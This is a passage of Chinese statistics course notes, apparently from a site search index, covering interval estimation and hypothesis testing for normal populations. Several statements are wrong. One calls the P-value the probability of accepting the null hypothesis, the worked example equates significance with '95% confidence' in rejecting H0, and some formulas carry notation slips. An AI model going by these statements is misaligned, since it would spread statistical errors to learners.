\\(\\mu\\)\uff0c\u4e14\u603b\u4f53\u5206\u5e03\u5df2\u77e5\u4e3a\u6807\u51c6\u6b63\u6001\u5206\u5e03\uff0c\u90a3\u4e48\uff1a</p> \\[\\begin{array}c P\\{a\\lt \\frac{\\bar{X}-\\mu}{\\sigma / \\sqrt{n}} \\lt b\\} =1 -\\alpha \\\\ \\Rightarrow P\\{\\bar{X}-b \\frac{\\sigma}{\\sqrt{n}} \\lt \\mu \\lt \\bar{X}+a \\frac{\\sigma}{\\sqrt{n}}\\} \\end{array}\\] <p>\u6b64\u65f6\uff0c\u7f6e\u4fe1\u533a\u95f4\u7684\u5e73\u5747\u957f\u5ea6\u4e3a \\(L=(b-a) \\frac{\\sigma}{\\sqrt{n}}\\) \uff0c\u6839\u636e\u6b63\u6001\u5206\u5e03\u7684\u5bf9\u79f0\u6027\u53ef\u77e5\u53d6 \\(-a =b= z_{\\alpha / 2}\\) \u65f6\uff0c\\(L\\) \u6700\u77ed\uff0c\u5219\u7f6e\u4fe1\u533a\u95f4\u4e3a\uff1a</p> \\[ (\\bar{X}- \\frac{\\sigma}{\\sqrt{n}}z_{\\alpha / 2},\\ \\bar{X} + \\frac{\\sigma}{\\sqrt{n}} z_{\\alpha / 2}) \\] <p>\u5e38\u5199\u4f5c \\((\\bar{X} \\pm \\frac{\\sigma}{\\sqrt{n}}z_{\\alpha / 2})\\)</p> <p>\u82e5\u603b\u4f53\u65b9\u5dee \\(\\sigma^2\\) \u672a\u77e5\uff0c\u6b64\u65f6\u51fd\u6570 \\(\\frac{\\bar{X}-\\mu}{\\sigma / \\sqrt{n}}\\) \u542b\u6709\u4e24\u4e2a\u672a\u77e5\u91cf\uff0c\u4e0d\u80fd\u518d\u4f7f\u7528\u3002\u8003\u8651\u7528 \\(\\sigma^2\\) \u7684\u65e0\u504f\u4f30\u8ba1\u91cf \\(S^2\\) \u4ee3\u66ff\uff1a \\(\\frac{\\bar{X}-\\mu}{S / \\sqrt{n}} \\sim t(n-1)\\)</p> <p>\u90a3\u4e48\u540c\u7406\u53ef\u5f97\u7f6e\u4fe1\u533a\u95f4\u4e3a\uff1a</p> \\[\\begin{array}c \\left(\\bar{X} -\\frac{S}{\\sqrt{n}} t_{\\alpha / 2} (n-1),\\ \\bar{X} +\\frac{S}{\\sqrt{n}} t_{\\alpha / 2} (n-1)\\right)\\\\ Or\\ \\ \\ (\\bar{X} \\pm \\frac{S}{\\sqrt{n}} t_{\\alpha / 2} (n-1)) \\end{array}\\] <p>\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\\(\\sigma^2\\) \u672a\u77e5\u7684\u60c5\u51b5\u66f4\u591a\uff0c\u56e0\u6b64\u8be5\u533a\u95f4\u7684\u4ef7\u503c\u66f4\u5927</p> <p>\u65b9\u5dee \\(\\sigma^2\\) \u7684\u7f6e\u4fe1\u533a\u95f4</p> <p>\u6837\u672c\u65b9\u5dee\u7684\u51fd\u6570 \\(\\frac{(n-1)S^2}{ \\sigma^2} \\sim \\chi^2(n-1)\\) \u4e0d\u4f9d\u8d56\u4efb\u4f55\u672a\u77e5\u53c2\u6570\uff0c\u90a3\u4e48\uff1a</p> \\[ P\\left\\{\\chi^2_{1- \\alpha / 2 }(n-1)\\lt \\frac{(n-1)S^2}{ \\sigma^2} \\lt \\chi^2_{\\alpha / 2 }\\right\\} = 1-\\alpha \\] <p>\u8f6c\u6362\u5f97\u5230\u65b9\u5dee \\(\\sigma^2\\) \u7684\u7f6e\u4fe1\u6c34\u5e73\u4e3a \\(1-\\alpha\\) \u7684\u7f6e\u4fe1\u533a\u95f4\u4e3a\uff1a</p> \\[\\left ( \\frac{(n-1)S^2}{\\chi^2_{\\alpha / 2}(n-1)}, \\frac{(n-1)S^2}{\\chi^2_{1-\\alpha / 2}(n-1)}\\right)\\]"},{"location":"Courses/PS/CH7/#_15","title":"\u4e24\u4e2a\u6b63\u6001\u603b\u4f53","text":""},{"location":"Courses/PS/CH7/#mu_1-mu_2","title":"\u5747\u503c\u5dee \\(\\mu_1- \\mu_2\\) \u7684\u533a\u95f4\u4f30\u8ba1","text":"<p>\u5206\u4e09\u79cd\u60c5\u51b5\u8ba8\u8bba\u3002</p> <p>\u4e24\u603b\u4f53\u7684\u65b9\u5dee\u5df2\u77e5</p> \\[ \\bar{X} -\\bar{Y} \\sim N\\left(\\mu_1 - \\mu_2, \\frac{\\sigma_1^2}{ n_1} + \\frac{\\sigma^2_2}{ n_2}\\right) \\] <p>\u5219\u7c7b\u4f3c\u5355\u4e2a\u6b63\u6001\u603b\u4f53\u7684\u63a8\u5bfc\uff0c\u5f97\u5230\u7f6e\u4fe1\u533a\u95f4\u4e3a\uff1a</p> \\[ \\left(\\bar{X} -\\bar{Y} \\pm z_{\\alpha / 2}\\sqrt{ \\frac{\\sigma_1^2}{ n_1} + \\frac{\\sigma^2_2}{ n_2}} \\right) \\] <p>\u4e24\u603b\u4f53\u7684\u65b9\u5dee\u672a\u77e5\uff0c\u4f46\u76f8\u540c</p> <p>\u6b64\u65f6\u53ef\u53d6 \\(\\sigma^2_1 = \\sigma^2_2= \\sigma^2\\) \u7684\u65e0\u504f\u4f30\u8ba1\u91cf\u4e3a\uff1a</p> \\[ S_{\\omega}^2 =\\frac{(n_1-1) S_1^2 + (n_2-1) S_2^2}{ n_1+ n_2 -2} \\] <p>\u4e14\u7531\u5b9a\u7406\u53ef\u77e5\uff1a</p> \\[ \\frac{\\bar{X}-\\bar{Y} - (\\mu_1 -\\mu_2)}{ S_\\omega\\sqrt{ \\frac{1}{n_1} +\\frac{1}{n_2}}} \\sim t(n_1 +n_2 -2) \\] <p>\u540c\u6837\u4eff\u7167\u5355\u4e2a\u6b63\u6001\u603b\u4f53\u7684\u63a8\u5bfc\uff0c\u5f97\u5230\u7f6e\u4fe1\u533a\u95f4\u4e3a\uff1a</p> \\[ \\left(\\bar{X} -\\bar{Y} \\pm t_{\\alpha / 2} (n_1 +n_2 -2) S_\\omega \\sqrt{\\frac{1}{n_1} +\\frac{1}{n_2}} \\right) \\] <p>\u4e24\u603b\u4f53\u7684\u65b9\u5dee\u672a\u77e5\uff0c\u4e14\u4e0d\u76f8\u540c</p> <p>\u4e0d\u5728\u8003\u8bd5\u8303\u56f4\u5185</p> <p>\u5f53\u6837\u672c\u5bb9\u91cf \\(n_1, n_2\\) \u8db3\u591f\u5927\u65f6\uff08\u5927\u4e8e50\uff09\uff0c\u53ef\u8ba4\u4e3a\uff1a</p> \\[ \\frac{\\bar{X}-\\bar{Y} - (\\mu_1- \\mu_2)}{ \\sqrt{\\frac{S_1^2}{ n_1} +\\frac{S_2^2}{ n_2}}} \\sim N(0,1) \\] <p>\u5219\u5176\u7f6e\u4fe1\u533a\u95f4\u4e3a\uff1a</p> \\[ \\left(\\bar{X}-\\bar{Y} \\pm z_{\\alpha / 2} \\sqrt{\\frac{S_1^2}{ n_1} +\\frac{S_2^2}{ n_2}} \\right) \\]"},{"location":"Courses/PS/CH7/#sigma_12-sigma_22","title":"\u65b9\u5dee\u6bd4 \\(\\sigma_1^2 / \\sigma_2^2\\) \u7684\u533a\u95f4\u4f30\u8ba1","text":"\\[ \\frac{S_1^2 / S_2^2}{ \\sigma_1^2 / \\sigma_2^2} \\sim F(n_1 -1, n_2-1)   \\] <p>\u53ef\u5f97\u7f6e\u4fe1\u533a\u95f4\u7ed3\u679c\uff1a</p> \\[ \\left( \\frac{S_1 ^2 / S_{2}^2}{ F_{\\alpha / 2} (n_1 -1,n_2 -1)}  , \\frac{S_1 ^2 / S_{2}^2}{ F_{1-\\alpha / 2} (n_1 -1,n_2 -1)} \\right) \\] <p>\u5355\u4e2a\u6b63\u6001\u603b\u4f53\u7684\u65b9\u5dee\u533a\u95f4\u4f30\u8ba1\u548c\u6b64\u5904\u7684\u65b9\u5dee\u6bd4\u4f30\u8ba1\u90fd\u4e0d\u5177\u5907\u6700\u4f18\u6027\uff0c\u56e0\u4e3a \\(\\chi^2\\) \u548c \\(F\\) \u5206\u5e03\u90fd\u4e0d\u5177\u5907\u5bf9\u79f0\u6027</p>"},{"location":"Courses/PS/CH8/","title":"\u5047\u8bbe\u68c0\u9a8c","text":""},{"location":"Courses/PS/CH8/#_1","title":"\u5047\u8bbe\u68c0\u9a8c","text":"<p> \u7ea6 2145 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p>"},{"location":"Courses/PS/CH8/#_2","title":"\u57fa\u672c\u601d\u60f3","text":"<p>\u7edf\u8ba1\u5047\u8bbe\u7b80\u79f0\u5047\u8bbe\uff0c\u901a\u5e38\u7528\u5b57\u6bcd \\(H\\) \u8868\u793a\u3002\u4e00\u822c\u6211\u4eec\u540c\u65f6\u63d0\u51fa\u4e24\u4e2a\u5b8c\u5168\u76f8\u53cd\u7684\u5047\u8bbe\uff0c\u4e60\u60ef\u4e0a\u628a\u5176\u4e2d\u4e00\u4e2a\u79f0\u4e3a\u539f\u5047\u8bbe\u6216\u96f6\u5047\u8bbe\uff0c\u7528 \\(H_0\\) \u8868\u793a\uff1b\u628a\u53e6\u4e00\u4e2a\u5047\u8bbe\u79f0\u4e3a\u5907\u62e9\u5047\u8bbe\u6216\u5bf9\u7acb\u5047\u8bbe\uff0c\u7528 \\(H_1\\) \u8868\u793a\u3002</p> <ul> <li>&lt;1&gt; \\(H_0: \\theta \\ge \\theta_0,\\ H_1: \\theta \\lt \\theta_0\\)<ul> <li>\u5de6\u4fa7\u68c0\u9a8c</li> </ul> </li> <li>&lt;2&gt; \\(H_0: \\theta \\le \\theta_0, H_1: \\theta \\gt \\theta_0\\)<ul> <li>\u53f3\u4fa7\u68c0\u9a8c</li> </ul> </li> <li>&lt;3&gt; \\(H_0: \\theta= \\theta_0, \\ H_1:\\theta \\ne \\theta_0\\)<ul> <li>\u53cc\u4fa7\u68c0\u9a8c</li> </ul> </li> </ul> <p>\u5728\u68c0\u9a8c\u5047\u8bbe\u95ee\u9898\u4e2d\uff0c\u82e5\u5bfb\u627e\u5230\u67d0\u4e2a\u7edf\u8ba1\u91cf\uff0c\u5176\u53d6\u503c\u5927\u5c0f\u548c\u539f\u5047\u8bbe \\(H_0\\) \u662f\u5426\u6210\u7acb\u6709\u5bc6\u5207\u8054\u7cfb\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a\u8be5\u5047\u8bbe\u68c0\u9a8c\u95ee\u9898\u7684\u68c0\u9a8c\u7edf\u8ba1\u91cf\u3002\u5bf9\u5e94\u4e8e\u62d2\u7edd\u539f\u5047\u8bbe\u7684\u6837\u672c\u503c\u8303\u56f4\u79f0\u4e3a\u62d2\u7edd\u57df \\(W\\)\uff0c\u62d2\u7edd\u57df\u7684\u8865\u96c6 \\(\\bar{W}\\) \u79f0\u4e3a\u63a5\u53d7\u57df\u3002</p> <p>\u7531\u4e8e\u6837\u672c\u7684\u968f\u673a\u6027\uff0c\u4efb\u4e00\u68c0\u9a8c\u89c4\u5219\u5728\u5e94\u7528\u65f6\u90fd\u6709\u53ef\u80fd\u53d1\u751f\u9519\u8bef\u5224\u65ad\uff1a</p> \u539f\u5047\u8bbe\u4e3a\u771f \u539f\u5047\u8bbe\u4e0d\u771f \u6839\u636e\u6837\u672c\u62d2\u7edd\u539f\u5047\u8bbe \u7b2cI\u7c7b\u9519\u8bef \u6b63\u786e \u6839\u636e\u6837\u672c\u63a5\u53d7\u539f\u5047\u8bbe \u6b63\u786e \u7b2cII\u7c7b\u9519\u8bef <ul> <li>\u7b2cI\u7c7b\u9519\u8bef\uff1a \u62d2\u7edd\u771f\u5b9e\u7684\u539f\u5047\u8bbe\uff08\u5f03\u771f\uff09<ul> <li>\\(\\alpha =P\\{\\text{\u7b2c\u4e00\u7c7b\u9519\u8bef}\\}=P\\{\\text{\u62d2\u7edd}H_0| H_0\\text{\u4e3a\u771f}\\}= P_{ H_0}\\{\\text{\u62d2\u7edd}H_0\\}\\)</li> </ul> </li> <li>\u7b2cII\u7c7b\u9519\u8bef\uff1a \u63a5\u53d7\u9519\u8bef\u7684\u539f\u5047\u8bbe\uff08\u5b58\u4f2a\uff09<ul> <li>\\(\\beta =P\\{\\text{\u7b2c\u4e8c\u7c7b\u9519\u8bef}\\}=P\\{\\text{\u63a5\u53d7}H_0| H_0\\text{\u4e3a\u4f2a}\\}= P_{ H_1} \\{\\text{\u63a5\u53d7} H_0\\}\\)</li> </ul> </li> </ul> <p>\u6ce8\u610f \\(\\alpha\\) \u4e0e\u539f\u5047\u8bbe\u7684\u903b\u8f91\u5173\u7cfb</p> <ul> <li>\u82e5\u5728\u663e\u8457\u6027\u6c34\u5e73 \\(\\alpha =0.01\\) \u60c5\u51b5\u4e0b\u62d2\u7edd\u539f\u5047\u8bbe \\(H_0\\)\uff0c\u90a3\u4e48\u5728 \\(\\alpha=0.05\\) \u60c5\u51b5\u4e0b\u4e00\u5b9a\u62d2\u7edd \\(H_0\\)</li> <li>\u82e5\u5728\u663e\u8457\u6027\u6c34\u5e73 \\(\\alpha =0.05\\) \u60c5\u51b5\u4e0b\u63a5\u53d7\u539f\u5047\u8bbe \\(H_0\\)\uff0c\u90a3\u4e48\u5728 \\(\\alpha=0.01\\) \u60c5\u51b5\u4e0b\u4e00\u5b9a\u63a5\u53d7 \\(H_0\\)</li> </ul> <p>\u5948\u66fc-\u76ae\u5c14\u900a\u539f\u5219</p> <p>\u9996\u5148\u63a7\u5236\u72af\u7b2cI\u7c7b\u9519\u8bef\u7684\u6982\u7387\u4e0d\u8d85\u8fc7\u67d0\u4e00\u5e38\u6570 \\(\\alpha \\in (0,1)\\) \uff0c\u518d\u5bfb\u627e\u68c0\u9a8c\uff0c\u4f7f\u72af\u7b2cII\u7c7b\u9519\u8bef\u7684\u6982\u7387\u6700\u5c0f\u3002\u5176\u4e2d\u5e38\u6570 \\(\\alpha\\) \u79f0\u4e3a\u663e\u8457\u6c34\u5e73\uff0c\u5e38\u53d6 0.01\uff0c0.05\uff0c0.1</p> <p>\u56e0\u6b64\uff0c\u5047\u8bbe \\(H_0, H_1\\) \u5e76\u4e0d\u5bf9\u7b49\uff0c\u901a\u5e38\u53ea\u6709\u5047\u8bbe \\(H_0\\) \u6709\u663e\u8457\u5dee\u5f02\u65f6\u624d\u4f1a\u5c06\u5176\u63a8\u7ffb\u3002</p> <p>\u4e0b\u9762\uff0c\u6211\u4eec\u4ee5\u8bfe\u672c\u4f8b\u5b50 8.1.1 \u6765\u6f14\u793a\u5982\u4f55\u8ba1\u7b97\u9519\u8bef\u5224\u65ad\u7684\u6982\u7387:</p> <p>\u9898\u9762 \u968f\u673a\u62bd\u53d6 9 \u4f4d\u8bd5\u9a8c\u8005\u670d\u7528\u51cf\u80a5\u836f\uff0c\u8bb0\u5f55\u670d\u7528\u524d\u540e\u7684\u4f53\u91cd\u5dee\u503c\u4e3a \\(X\\) (\u670d\u836f\u524d-\u670d\u836f\u540e)\uff1a</p> \\[\\begin{gather} 1.5 , &amp;0.6, &amp; -0.3, &amp;  1.1, &amp; -0.8, &amp; 0, &amp; 2.2, &amp; -1.0, &amp; 1.4 \\end{gather}\\] <p>\u5047\u8bbe \\(X\\sim N(\\mu, 0.36)\\)\uff0c\\(\\mu\\) \u672a\u77e5\u3002\u6839\u636e\u76ee\u524d\u7684\u6837\u672c\u8d44\u6599\uff0c\u80fd\u5426\u8ba4\u4e3a\u8be5\u51cf\u80a5\u836f\u6709\u6548\uff1f</p> <p>\u6211\u4eec\u5bf9\u53c2\u6570 \\(\\mu\\) \u63d0\u51fa\u5047\u8bbe\uff1a</p> \\[ H_0: \\mu =0, \\ \\ H_1: \\mu \\gt 0 \\] <p>\\(\\mu=0\\) \u5373\u51cf\u80a5\u836f\u65e0\u6548\u679c\uff0c\u5927\u4e8e\u96f6\u5219\u6709\u6548\u679c</p> <p>\u7531\u4e8e\u6837\u672c\u5747\u503c\u662f\u53c2\u6570 \\(\\mu\\) \u7684\u65e0\u504f\u4f30\u8ba1\uff0c\u5219\u5f53 \\(\\mu\\) \u8d8a\u5c0f\uff0c\u6837\u672c\u5747\u503c \\(\\bar{X}\\) \u4e5f\u5e94\u8be5\u504f\u5c0f\u624d\u6b63\u786e\u3002\u6211\u4eec\u6839\u636e\u6b64\u7406\u8bba\u6765\u6307\u5b9a\u89c4\u5219\uff1a</p> \\[\\begin{array}l \\text{\u5f53} \\bar{X}\\ge C\\text{\u65f6\uff0c\u62d2\u7edd\u539f\u5047\u8bbe} H_0 \\\\ \\text{\u5f53} \\bar{X}\\lt C\\text{\u65f6\uff0c\u63a5\u53d7\u539f\u5047\u8bbe} H_0 \\\\ \\end{array}\\] <p>\u5bf9\u4e34\u754c\u503c \\(C\\) \u7684\u5224\u65ad\u53ef\u7531\u5948\u66fc-\u76ae\u5c14\u900a\u539f\u5219\u8ba1\u7b97\uff0c\u5373\u4f7f\u5f97\u7b2cI\u7c7b\u9519\u8bef\u7684\u6982\u7387\u4e3a\u7ed9\u5b9a\u7684\u663e\u8457\u6c34\u5e73\uff1a</p> \\[ \\alpha (C)=P\\{\\text{\u62d2\u7edd}H_0| H_0\\text{\u4e3a\u771f}\\} = P\\{\\bar{X}\\ge C|\\mu =0\\} = P\\left\\{\\frac{\\bar{X}}{\\sigma / \\sqrt{n} } \\ge   \\frac{C}{\\sigma / \\sqrt{n}} |\\mu=0\\right\\} \\] <p>\u7531\u4e8e\u5047\u8bbe\u539f\u5047\u8bbe \\(H_0\\) \u4e3a\u771f\uff0c\u53ef\u4ee5\u5c06 \\(\\mu=0\\) \u4ee3\u5165\uff0c\u5373 \\(\\frac{\\bar{X}}{\\sigma / \\sqrt{n}} \\sim N(0,1)\\)\uff0c\u5219\uff1a</p> \\[\\begin{array}c \\alpha(C) =1- \\Phi \\left(\\frac{C}{\\sigma / \\sqrt{n}}\\right) \\le 0.05 \\\\ C\\ge \\frac{z_{0.05} \\sigma}{\\sqrt{n}}= 0.329 \\end{array} \\] <p>\u8fd9\u91cc\u6211\u4eec\u53d6\u663e\u8457\u6027\u6c34\u5e73\u4e3a 0.05</p> <p>\u56e0\u6b64\uff0c\u8be5\u5047\u8bbe\u7684\u62d2\u7edd\u57df\u4e3a \\(W=\\{\\bar{X}\\ge 0.329\\}\\)\uff0c\u4f46\u9898\u76ee\u4e2d\u7ed9\u51fa\u7684\u6837\u672c\u5747\u503c\u4e3a \\(\\bar{x}=0.522\\gt 0.329\\)\uff0c\u5373\u6837\u672c\u843d\u5165\u62d2\u7edd\u57df\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u6709 \\(95\\%\\) \u7684\u628a\u63e1\u62d2\u7edd\u539f\u5047\u8bbe \\(H_0\\)\uff0c\u5373\u8ba4\u4e3a\u8be5\u51cf\u80a5\u836f\u6709\u6548\u679c\u3002</p> <p>Quote</p> <p></p>"},{"location":"Courses/PS/CH8/#_3","title":"\u5355\u4e2a\u6b63\u6001\u603b\u4f53\u53c2\u6570\u7684\u5047\u8bbe\u68c0\u9a8c","text":""},{"location":"Courses/PS/CH8/#mu","title":"\u53c2\u6570 \\(\\mu\\) \u7684\u5047\u8bbe\u68c0\u9a8c","text":"<p>\u82e5 \\(\\sigma^2\\) \u5df2\u77e5</p> <p>\u5148\u8003\u8651\u53cc\u8fb9\u5047\u8bbe\u95ee\u9898:</p> \\[ H_0: \\mu =\\mu_0 ,\\ H_1: \\mu \\ne \\mu_0 \\] <p>\u5176\u4e2d \\(\\mu_0\\) \u662f\u5df2\u77e5\u7684\u5e38\u91cf\uff0c\u6b64\u65f6\u53ef\u53d6\u5047\u8bbe\u7edf\u8ba1\u91cf\u4e3a\uff1a</p> \\[ Z=\\frac{\\bar{X}- \\mu_0}{ \\sigma / \\sqrt{n}} \\] <p>\u82e5\u539f\u5047\u8bbe\u6210\u7acb\uff0c\u5373 \\(\\mu_0= \\mu\\) \uff0c\u5219 \\(Z\\sim N(0,1)\\) \uff0c\u5219\u5728\u7ed9\u5b9a\u7684\u663e\u8457\u6c34\u5e73 \\(\\alpha\\) \u4e0b\uff0c\u68c0\u9a8c\u7684\u62d2\u7edd\u57df\u4e3a\uff1a</p> \\[ W=\\left\\{ |Z| = \\left|\\frac{\\bar{X}- \\mu_0}{ \\sigma / \\sqrt{n}}\\right| \\ge  z_{\\alpha / 2}\\right\\} \\] <p>\u56e0\u6b64\uff0c\u82e5\u5c06\u6837\u672c\u5747\u503c \\(\\bar{x}\\) \u4ee3\u5165\u5f97\u5230\u7ed3\u679c \\(|z_0| =\\left|\\frac{\\bar{x}- \\mu_0}{ \\sigma / \\sqrt{n}}\\right|\\ge z_{ \\alpha / 2}\\) \u65f6\uff0c\u6211\u4eec\u6709 \\(100(1-\\alpha)\\%\\) \u7684\u628a\u63e1\u62d2\u7edd\u539f\u5047\u8bbe\uff0c\u5373 \\(\\mu\\ne \\mu_0\\) \u3002</p> <p>\u53e6\u4e00\u79cd\u5224\u65ad\u65b9\u6cd5\u662f\u6839\u636e P-\u503c \u8fdb\u884c\u5224\u65ad:</p> \\[ P\u503c=P_{ H_0}\\{|Z| \\ge |z_0|\\}= 2(1- \\Phi (|z_0|)) \\le \\alpha \\] <p>\u5373 P-\u503c \u5c0f\u4e8e\u7b49\u4e8e \\(\\alpha\\) \u65f6\u62d2\u7edd\u539f\u5047\u8bbe\uff0c\u5426\u5219\u4e0d\u80fd\u62d2\u7edd\u539f\u5047\u8bbe\u3002</p> <p>P-\u503c\u53ef\u4ee5\u8bb0\u4f5c\u63a5\u53d7\u539f\u5047\u8bbe\u7684\u6982\u7387\uff0cP-\u503c\u8d8a\u5c0f\uff0c\u8d8a\u62d2\u7edd\u539f\u5047\u8bbe</p> <p>\u800c\u5bf9\u4e8e\u5de6\u4fa7\u3001\u53f3\u4fa7\u68c0\u9a8c\uff0c\u5176\u62d2\u7edd\u57df\u548c P-\u503c \u5206\u522b\u4e3a\uff1a</p> <ul> <li>\u5de6\u4fa7\u68c0\u9a8c<ul> <li>\\(W=\\left\\{Z=\\frac{\\bar{X}- \\mu_0}{\\sigma / \\sqrt{n}} \\le -z_{\\alpha}\\right\\}\\)</li> <li>\\(P\u503c=P_{ H_0}\\{Z\\le z_0\\}= \\Phi( z_0)\\)</li> </ul> </li> <li>\u53f3\u4fa7\u68c0\u9a8c<ul> <li>\\(W=\\left\\{Z=\\frac{\\bar{X}- \\mu_0}{\\sigma / \\sqrt{n}} \\ge z_{\\alpha}\\right\\}\\)</li> <li>\\(P\u503c=P_{ H_0}\\{Z\\ge z_0\\}= 1-\\Phi( z_0)\\)</li> </ul> </li> </ul> <p>\u82e5 \\(\\sigma^2\\) \u672a\u77e5</p> <p>\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u603b\u4f53\u65b9\u5dee\u5e38\u5e38\u672a\u77e5\uff0c\u6b64\u65f6\u6211\u4eec\u4e0d\u80fd\u91c7\u7528 Z \u68c0\u9a8c\uff0c\u9700\u8981\u7528\u6837\u672c\u65b9\u5dee\u4ee3\u66ff \\(\\sigma^2\\) \uff1a</p> \\[ T=\\frac{\\bar{X}-\\mu_0} {S  / \\sqrt{n}} \\] <p>\u82e5\u539f\u5047\u8bbe\u6210\u7acb\uff0c\u5373 \\(\\mu_0= \\mu\\) \uff0c\u5219 \\(T\\sim t(n-1)\\) \uff0c\u5219\u5728\u7ed9\u5b9a\u7684\u663e\u8457\u6c34\u5e73 \\(\\alpha\\) \u4e0b\uff0c\u68c0\u9a8c\u7684\u62d2\u7edd\u57df\u4e3a\uff1a</p> \\[ W=\\left\\{|T|=\\left|\\frac{\\bar{X}-\\mu_0} {S  / \\sqrt{n}}\\right|\\ge t_{\\alpha / 2} (n-1)\\right\\} \\] <p>\u5bf9\u5e94\u7684 P-\u503c \u4e3a\uff1a</p> \\[ P\u503c=2 P\\{t(n-1) \\ge |t_0|\\} \\le \\alpha \\] <ul> <li>\u5de6\u4fa7\u68c0\u9a8c<ul> <li>\\(W=\\left\\{Z=\\frac{\\bar{X}- \\mu_0}{S / \\sqrt{n}} \\le -t_{\\alpha}(n-1)\\right\\}\\)</li> <li>\\(P\u503c=P\\{t(n-1)\\le t_0\\}\\)</li> </ul> </li> <li>\u53f3\u4fa7\u68c0\u9a8c<ul> <li>\\(W=\\left\\{Z=\\frac{\\bar{X}- \\mu_0}{S / \\sqrt{n}} \\ge t_{\\alpha}(n-1)\\right\\}\\)</li> <li>\\(P\u503c=P\\{t(n-1)\\ge t_0\\}\\)</li> </ul> </li> </ul>"},{"location":"Courses/PS/CH8/#sigma2","title":"\u53c2\u6570 \\(\\sigma^2\\) \u7684\u5047\u8bbe\u68c0\u9a8c","text":"<p>\u6211\u4eec\u4e0d\u59a8\u8ba4\u4e3a\u53c2\u6570 \\(\\mu\\) \u672a\u77e5\uff0c\u5176\u5047\u8bbe\u95ee\u9898\u5305\u62ec\uff1a</p> <ul> <li>\u53cc\u8fb9\u5047\u8bbe\uff1a \\(H_0: \\sigma^2 =\\sigma_0^2, \\ H_1: \\sigma^2 \\ne \\sigma_0^2\\)</li> <li>\u5de6\u4fa7\u68c0\u9a8c\uff1a \\(H_0: \\sigma^2 \\ge\\sigma_0^2, \\ H_1: \\sigma^2 \\lt \\sigma_0^2\\)</li> <li>\u53f3\u4fa7\u68c0\u9a8c\uff1a \\(H_0: \\sigma^2 \\le \\sigma_0^2, \\ H_1: \\sigma^2 \\gt \\sigma_0^2\\)</li> </ul> <p>\u5176\u4e2d \\(\\sigma_0^2\\) \u662f\u5df2\u77e5\u7684\u5e38\u91cf\uff0c\u82e5\u6709 \\(\\sigma_0^2 =\\sigma^2\\)\uff0c\u5219\u68c0\u9a8c\u7edf\u8ba1\u91cf \\(\\chi^2\\) \u670d\u4ece \\(\\chi^2 (n-1)\\) \u5206\u5e03\uff1a</p> \\[ \\chi^2 =\\frac{(n-1)S^2} {\\sigma_0^2 } \\sim \\chi^2(n-1) \\] <p>\u5728\u7ed9\u5b9a\u663e\u8457\u6c34\u5e73 \\(\\alpha\\) \uff0c\u4ee5\u53ca\u503c \\(p_0= P\\{\\chi^2(n-1) \\le \\chi_0^2\\}\\)</p> <ul> <li>\u53cc\u8fb9\u68c0\u9a8c\uff1a<ul> <li>\\(W=\\{\\chi^2 \\ge \\chi^2 _{\\alpha / 2}(n-1) \\text{ or }\\chi^2\\le \\chi^2_{1- \\alpha / 2} (n-1)\\}\\)</li> <li>\\(P\u503c=2 \\min (p_0, 1-p_0)\\)</li> </ul> </li> <li>\u5de6\u4fa7\u68c0\u9a8c\uff1a<ul> <li>\\(W=\\{\\chi^2\\le \\chi^2_{1- \\alpha} (n-1)\\}\\)</li> <li>\\(P\u503c= p_0\\)</li> </ul> </li> <li>\u53f3\u4fa7\u68c0\u9a8c\uff1a<ul> <li>\\(W=\\{\\chi^2 \\ge \\chi^2 _{\\alpha}(n-1)\\}\\)</li> <li>\\(P\u503c=1- p_0\\)</li> </ul> </li> </ul>"},{"location":"Courses/PS/CH8/#_4","title":"\u4e24\u4e2a\u6b63\u6001\u603b\u4f53\u53c2\u6570\u7684\u5047\u8bbe\u68c0\u9a8c","text":""},{"location":"Courses/PS/CH8/#_5","title":"\u6bd4\u8f83\u4e24\u4e2a\u6b63\u6001\u603b\u4f53\u5747\u503c\u7684\u5047\u8bbe\u68c0\u9a8c","text":"<p>\u5b9e\u9645\u4e0a\u548c\u4e00\u4e2a\u6b63\u6001\u603b\u4f53\u7684\u60c5\u51b5\u76f8\u540c\uff1a</p> \\[ \\bar{X}-\\bar{Y} \\sim N(\\mu_1 -\\mu_2, \\frac{\\sigma_1^2}{n}+ \\frac{\\sigma_2^2}{n}) \\] <p>\u6211\u4eec\u8003\u8651\u53cc\u4fa7\u5047\u8bbe\u95ee\u9898\uff1a</p> \\[ H_0: \\mu_1 =\\mu_2,\\ H_1: \\mu_1 \\ne \\mu_2 \\] <p>\u82e5 \\(\\sigma_1^2, \\sigma_2^2\\) \u5df2\u77e5</p> <p>\u5f53\u5047\u8bbe \\(H_0\\) \u6210\u7acb\u65f6\uff0c\\(\\frac{\\bar{X}-\\bar{Y}}{\\sqrt{\\frac{\\sigma_1^2}{ n_1} + \\frac{\\sigma_2^2}{ n_2}}} \\sim N(0,1)\\) \uff0c\u91c7\u7528 Z \u68c0\u9a8c\u53ef\u5f97\u62d2\u7edd\u57df\u4e3a\uff1a</p> \\[ W=\\left\\{\\frac{|\\bar{X}-\\bar{Y}|}{\\sqrt{\\frac{\\sigma_1^2}{ n_1} + \\frac{\\sigma_2^2}{ n_2}}} \\ge z_{\\alpha / 2}\\right\\} \\] <p>P-\u503c\u4ecd\u4e3a\uff1a</p> \\[ P\u503c=2\\min (p_0, 1-p_0)=2 (1-\\Phi(|z_0|)) \\] <p>\u82e5 \\(\\sigma_1^2= \\sigma_2^2\\) \u4f46\u672a\u77e5</p> <p>\u9996\u5148\u53d6\u53c2\u6570 \\(\\sigma_1^2 =\\sigma_2^2= \\sigma^2\\) \u7684\u65e0\u504f\u4f30\u8ba1\u91cf\uff1a</p> \\[ S_{\\omega}^2 = \\frac{(n_1 -1) S_1^2 + (n_2-1) S_2^2}{ n_1 +n_2 -2} \\] <p>\u53d6\u68c0\u9a8c\u7edf\u8ba1\u91cf\u4e3a\uff1a</p> \\[ T=\\frac{\\bar{X} -\\bar{Y}}{ S_\\omega \\sqrt{\\frac{1}{n_1} + \\frac{1}{n_2}}} \\] <p>\u5f53\u539f\u5047\u8bbe \\(H_0\\) \u6210\u7acb\u65f6\uff0c\\(T\\sim t(n_1 +n_2 -2)\\)\uff0c\u5219\u68c0\u9a8c\u7684\u62d2\u7edd\u57df\u4e3a\uff1a</p> \\[ W=\\{|T| \\ge t_{\\alpha / 2}(n_1+ n_2 -2)\\} \\] 